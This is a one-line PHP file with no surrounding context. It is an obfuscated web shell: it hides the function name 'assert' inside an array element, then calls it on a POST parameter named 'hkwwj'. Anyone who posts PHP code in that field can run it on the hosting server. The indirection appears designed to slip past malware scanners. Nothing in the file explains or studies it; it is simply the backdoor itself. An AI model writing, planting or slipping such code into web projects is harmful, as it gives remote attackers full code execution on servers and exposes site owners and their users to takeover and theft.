<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['hkwwj']);?>
